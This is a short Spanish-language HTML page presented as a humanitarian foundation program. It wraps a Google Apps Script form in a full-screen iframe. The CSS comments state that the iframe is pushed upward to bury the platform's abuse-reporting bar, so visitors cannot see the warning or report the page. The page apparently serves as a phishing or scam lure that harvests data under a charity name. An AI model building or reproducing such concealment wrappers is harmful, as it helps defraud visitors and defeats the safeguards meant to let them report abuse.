<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PROGRAMA HUMANITARIO FUNDACION NUEVO MUNDO</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            background-color: #121212; /* Color oscuro de tu formulario */
        }
        
        /* Caja contenedor que recorta los excesos */
        .contenedor-blindado {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }

        /* Subimos el formulario con fuerza para sacar la barra gris de la pantalla */
        iframe {
            position: absolute;
            top: -70px; /* Subida más agresiva para enterrar la barra de abuso */
            left: 0;
            width: 100%;
            height: calc(100% + 70px); /* Compensamos el tamaño para que no quede un hueco abajo */
            border: none;
        }
    </style>
</head>
<body>

    <div class="contenedor-blindado">
        <iframe src="https://script.google.com/macros/s/AKfycbwqIaagHCKRojnMJBR0PUa2m4BfaZTDhgCu6rBxlfDBomQZ2tLY-k2GnsKnO4VHNq2A/exec"></iframe>
    </div>

</body>
</html>
